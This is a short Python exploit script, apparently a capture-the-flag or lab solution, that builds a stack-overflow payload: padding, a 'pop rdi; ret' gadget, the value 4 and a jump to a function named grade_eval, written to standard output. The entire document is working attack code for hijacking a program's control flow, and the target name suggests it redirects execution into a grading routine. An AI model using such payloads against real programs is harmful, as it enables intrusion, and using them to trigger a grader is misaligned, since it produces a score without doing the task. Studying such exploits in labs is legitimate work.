import sys

payload = b"A" * 24
payload += (0x401a33).to_bytes(8, "little")   # pop rdi; ret
payload += (4).to_bytes(8, "little")          # edi = 4
payload += (0x401978).to_bytes(8, "little")   # grade_eval
payload += b"\n"
sys.stdout.buffer.write(payload)
